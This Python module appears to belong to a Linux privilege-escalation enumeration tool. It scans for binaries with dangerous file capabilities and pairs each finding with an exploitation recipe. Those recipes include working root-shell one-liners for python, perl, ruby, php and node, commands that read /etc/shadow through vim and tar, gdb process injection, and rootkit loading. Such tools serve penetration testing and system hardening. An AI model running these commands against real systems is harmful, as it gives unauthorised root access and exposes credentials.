"""
Capabilities Enumerator
=======================

Enumerate Linux capabilities for privilege escalation.

Linux capabilities split root privileges into distinct units.
Binaries with certain capabilities can be exploited for privesc.
"""

import os
import re
from typing import List, Dict, Optional, Tuple

from ..core.base import BaseEnumerator
from ..core.findings import FindingSeverity


class CapabilitiesEnumerator(BaseEnumerator):
    """
    Enumerate Linux capabilities on binaries.

    Checks:
    - Files with capabilities (getcap)
    - Dangerous capabilities (cap_setuid, cap_sys_admin, etc.)
    - Exploitation methods for each capability
    """

    name = "Capabilities Enumerator"
    description = "Find binaries with exploitable Linux capabilities"

    # Capability exploitation techniques
    CAPABILITY_EXPLOITS: Dict[str, str] = {
        'cap_setuid': (
            'Binary can change UID to any user:\n'
            '  # If Python:\n'
            '  ./python -c \'import os; os.setuid(0); os.system("/bin/bash")\''
        ),
        'cap_setgid': (
            'Binary can change GID to any group:\n'
            '  # Escalate to privileged group (shadow, disk, etc.)'
        ),
        'cap_dac_override': (
            'Binary can bypass all file permission checks:\n'
            '  # Can read/write any file regardless of permissions\n'
            '  # Read /etc/shadow, write to /etc/passwd, etc.'
        ),
        'cap_dac_read_search': (
            'Binary can read any file:\n'
            '  # Read sensitive files:\n'
            '  ./binary /etc/shadow\n'
            '  ./binary /root/.ssh/id_rsa'
        ),
        'cap_sys_admin': (
            'Very powerful capability (container escape, mount, etc.):\n'
            '  # Container escape via /proc:\n'
            '  mount -t proc proc /proc\n'
            '  # Or via cgroups release_agent'
        ),
        'cap_sys_ptrace': (
            'Can trace and inject into processes:\n'
            '  # Inject shellcode into root process:\n'
            '  ./binary -p <root_pid>\n'
            '  # Or use pspy to monitor processes'
        ),
        'cap_sys_module': (
            'Can load kernel modules:\n'
            '  # Create malicious kernel module\n'
            '  insmod rootkit.ko'
        ),
        'cap_net_raw': (
            'Raw socket access (packet sniffing):\n'
            '  # Capture network traffic:\n'
            '  tcpdump -i any -w capture.pcap'
        ),
        'cap_net_bind_service': (
            'Can bind to privileged ports (<1024):\n'
            '  # Set up fake service on port 80, 443, etc.'
        ),
        'cap_chown': (
            'Can change file ownership:\n'
            '  # Take ownership of sensitive files:\n'
            '  chown user /etc/shadow'
        ),
        'cap_fowner': (
            'Bypass permission checks for file owner:\n'
            '  # Modify files as if owner'
        ),
        'cap_fsetid': (
            'Don\'t clear SUID/SGID bits on file write:\n'
            '  # Modify SUID binary while preserving SUID'
        ),
        'cap_setfcap': (
            'Can set file capabilities:\n'
            '  # Add cap_setuid to any binary:\n'
            '  setcap cap_setuid+ep /path/to/binary'
        ),
        'cap_mknod': (
            'Can create special files:\n'
            '  # Create device nodes for disk access'
        )
    }

    # Specific binary + capability exploitation
    BINARY_CAP_EXPLOITS: Dict[Tuple[str, str], str] = {
        ('python', 'cap_setuid'): (
            './python -c \'import os; os.setuid(0); os.system("/bin/bash")\''
        ),
        ('python3', 'cap_setuid'): (
            './python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\''
        ),
        ('perl', 'cap_setuid'): (
            './perl -e \'use POSIX qw(setuid); setuid(0); exec "/bin/bash";\''
        ),
        ('ruby', 'cap_setuid'): (
            './ruby -e \'Process::Sys.setuid(0); exec "/bin/bash"\''
        ),
        ('php', 'cap_setuid'): (
            './php -r \'posix_setuid(0); system("/bin/bash");\''
        ),
        ('node', 'cap_setuid'): (
            './node -e \'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})\''
        ),
        ('vim', 'cap_dac_read_search'): (
            './vim /etc/shadow'
        ),
        ('tar', 'cap_dac_read_search'): (
            './tar -cvf shadow.tar /etc/shadow && tar -xvf shadow.tar'
        ),
        ('gdb', 'cap_sys_ptrace'): (
            './gdb -p <root_process_pid>\n'
            '(gdb) call system("/bin/bash")'
        )
    }

    def enumerate(self) -> None:
        """Run capabilities enumeration"""
        self.print_header()

        # Check if getcap is available
        if not self._check_getcap():
            self.log("getcap not available - skipping capabilities check", "warning")
            return

        self._enumerate_capabilities()

    def _check_getcap(self) -> bool:
        """Check if getcap command is available"""
        output = self.run_command("which getcap 2>/dev/null")
        return bool(output)

    def _enumerate_capabilities(self) -> None:
        """Find files with capabilities"""
        self.log("Searching for files with capabilities...")

        output = self.run_command(
            "getcap -r / 2>/dev/null",
            timeout=120
        )

        if not output:
            self.log("No files with capabilities found")
            return

        self.log("Files with capabilities:", "success")
        print(output)

        # Parse and analyze each capability
        for line in output.split('\n'):
            if '=' in line:
                self._analyze_capability_line(line)

    def _analyze_capability_line(self, line: str) -> None:
        """Analyze a getcap output line"""
        try:
            # Format: /path/to/binary = cap_xxx,cap_yyy+ep
            parts = line.split('=')

            if len(parts) < 2:
                return

            file_path = parts[0].strip()
            caps_string = parts[1].strip()

            binary_name = os.path.basename(file_path)

            # Extract individual capabilities
            capabilities = self._parse_capabilities(caps_string)

            # Check each capability
            for cap in capabilities:
                if self.config.is_dangerous_capability(cap):
                    self._report_dangerous_capability(
                        file_path,
                        binary_name,
                        cap,
                        caps_string
                    )

        except Exception as e:
            if self.config.verbose:
                self.log(f"Error parsing: {line} - {e}", "error")

    def _parse_capabilities(self, caps_string: str) -> List[str]:
        """Extract capability names from capability string"""
        # Remove permission flags (+ep, +eip, etc.)
        caps_clean = re.sub(r'\+\w+', '', caps_string)

        # Split on comma
        capabilities = []

        for part in caps_clean.split(','):
            part = part.strip()
            if part:
                capabilities.append(part)

        return capabilities

    def _report_dangerous_capability(
            self,
            file_path: str,
            binary_name: str,
            capability: str,
            full_caps: str
    ) -> None:
        """Report a dangerous capability finding"""
        self.log(f"Dangerous capability: {capability} on {file_path}", "critical")

        # Get exploitation method
        exploitation = self._get_exploitation(binary_name, capability)

        # Determine severity
        if capability in ('cap_setuid', 'cap_sys_admin', 'cap_sys_ptrace'):
            severity = FindingSeverity.CRITICAL
            impact = "Critical - Direct root access possible"
        elif capability in ('cap_dac_override', 'cap_dac_read_search', 'cap_sys_module'):
            severity = FindingSeverity.CRITICAL
            impact = "Critical - Full filesystem access or kernel control"
        else:
            severity = FindingSeverity.HIGH
            impact = "High - Significant privilege escalation"

        self.add_finding(
            category=f"Dangerous Capability - {capability}",
            severity=severity,
            finding=f"Binary has {capability}: {file_path}",
            exploitation=exploitation,
            impact=impact,
            target=file_path,
            binary_name=binary_name,
            capability=capability,
            full_capabilities=full_caps
        )

    def _get_exploitation(self, binary_name: str, capability: str) -> str:
        """Get specific exploitation method for binary + capability"""
        # Check for specific binary + capability combo
        key = (binary_name, capability)

        if key in self.BINARY_CAP_EXPLOITS:
            specific_exploit = self.BINARY_CAP_EXPLOITS[key]
            return f"Specific exploit for {binary_name}:\n  {specific_exploit}"

        # Fall back to generic capability exploitation
        if capability in self.CAPABILITY_EXPLOITS:
            return self.CAPABILITY_EXPLOITS[capability]

        return f"Research exploitation for {capability} on {binary_name}"